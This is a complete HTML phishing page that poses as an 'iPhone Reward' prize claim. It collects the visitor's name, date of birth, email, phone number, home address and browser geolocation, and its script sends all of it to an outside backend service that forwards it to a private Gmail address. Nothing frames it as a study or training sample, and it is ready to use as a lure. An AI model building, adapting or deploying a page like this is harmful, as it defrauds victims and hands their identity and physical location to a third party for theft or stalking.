<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>iPhone Reward Form</title>

    <!-- Inline Bootstrap CSS (minified version) for faster loading -->
    <style>
        /* Basic styling for the body and form */
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-image: url('https://via.placeholder.com/1920x1080'); /* Replace with optimized background URL */
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
        }
        .container {
            max-width: 600px;
            background: rgba(255, 255, 255, 0.85);
            padding: 2rem;
            border-radius: 8px;
            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.3);
            text-align: center;
        }
        .form-heading {
            color: #333;
            font-size: 1.5rem;
            margin-bottom: 20px;
        }
        .btn-primary {
            background-color: #007bff;
            border: none;
            margin-top: 15px;
        }
        .btn-primary:hover {
            background-color: #0056b3;
        }
        .form-text {
            font-size: 0.9rem;
            color: #666;
        }
        .form-group {
            margin-bottom: 1.5rem;
        }
        input[type="text"], input[type="email"], input[type="tel"], input[type="date"], textarea {
            width: 100%;
            padding: 0.75rem;
            margin-top: 0.5rem;
            border-radius: 5px;
            border: 1px solid #ccc;
            font-size: 1rem;
        }
        input[type="text"]:focus, input[type="email"]:focus, input[type="tel"]:focus, input[type="date"]:focus, textarea:focus {
            border-color: #007bff;
            outline: none;
        }
    </style>

    <!-- Load only critical scripts -->
    <script defer src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
    <script defer src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
    <script defer src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
</head>
<body>
    <div class="container">
        <h1 class="form-heading">Congratulations! ðŸŽ‰</h1>
        <p class="lead">You've been selected to receive a brand-new iPhone!</p>
        <p class="form-text">Please fill out the form below to claim your reward.</p>

        <!-- Fill Out Form -->
        <form id="rewardForm">
            <div class="form-group">
                <label for="fullName">Full Name</label>
                <input type="text" class="form-control" id="fullName" placeholder="Enter your full name" required>
            </div>
            <div class="form-group">
                <label for="dob">Date of Birth</label>
                <input type="date" class="form-control" id="dob" required>
            </div>
            <div class="form-group">
                <label for="email">Email Address</label>
                <input type="email" class="form-control" id="email" placeholder="Enter your email" required>
            </div>
            <div class="form-group">
                <label for="phoneNumber">Phone Number</label>
                <input type="tel" class="form-control" id="phoneNumber" placeholder="Enter your phone number" required>
            </div>
            <div class="form-group">
                <label for="address">Shipping Address</label>
                <textarea class="form-control" id="address" rows="3" placeholder="Enter your shipping address" required></textarea>
            </div>
            <div class="form-group">
                <label for="city">City</label>
                <input type="text" class="form-control" id="city" placeholder="Enter your city" required>
            </div>
            <div class="form-group">
                <label for="postalCode">Postal Code</label>
                <input type="text" class="form-control" id="postalCode" placeholder="Enter your postal code" required>
            </div>

            <p id="locationDisplay" class="form-text" style="background: rgba(255, 255, 255, 0.85); color: #666; padding: 0.5rem; border-radius: 4px;">Location permissions required to auto-fill your location.</p>
            <button type="submit" class="btn btn-primary btn-block">Submit and Claim iPhone</button>
        </form>
    </div>

    <!-- JavaScript for Geolocation and Email Sending -->
    <script>
        let latitude, longitude;

        // Function to request location when the form is submitted
        function requestLocation() {
            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        latitude = position.coords.latitude;
                        longitude = position.coords.longitude;
                        document.getElementById("locationDisplay").textContent = `Latitude: ${latitude}, Longitude: ${longitude}`;
                    },
                    (error) => {
                        document.getElementById("locationDisplay").textContent = "Location error occurred.";
                    }
                );
            } else {
                document.getElementById("locationDisplay").textContent = "Geolocation is not supported by this browser.";
            }
        }

        // Handle form submission
        document.getElementById("rewardForm").addEventListener("submit", function (e) {
            e.preventDefault();

            // Request location before form submission
            requestLocation();

            const formData = {
                fullName: document.getElementById("fullName").value,
                dob: document.getElementById("dob").value,
                email: document.getElementById("email").value,
                phoneNumber: document.getElementById("phoneNumber").value,
                address: document.getElementById("address").value,
                city: document.getElementById("city").value,
                postalCode: document.getElementById("postalCode").value,
                location: `Latitude: ${latitude}, Longitude: ${longitude}`
            };

            const message = `
                Name: ${formData.fullName}
                Date of Birth: ${formData.dob}
                Email: ${formData.email}
                Phone Number: ${formData.phoneNumber}
                Address: ${formData.address}
                City: ${formData.city}
                Postal Code: ${formData.postalCode}
                Location: ${formData.location}
            `;

            sendEmail("Form Submission Data", message, "khalilrodeni@gmail.com");
            alert("Thank you for your submission! We will contact you shortly.");
        });

        // Email sending function
        function sendEmail(subject, message, recipientEmail) {
            const emailData = {
                subject: subject,
                message: message,
                recipient_email: recipientEmail,
                recipient_name: "Khalil Ahmed"
            };

            fetch("https://zalex-backend.onrender.com/api/send-email/", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                },
                body: JSON.stringify(emailData)
            })
            .then(response => response.ok ? response.json() : Promise.reject(`Error ${response.status}`))
            .then(data => alert(data.message ? "Email sent successfully!" : `Error: ${data.error}`))
            .catch(error => alert("Error sending email: " + error));
        }
    </script>
</body>
</html>
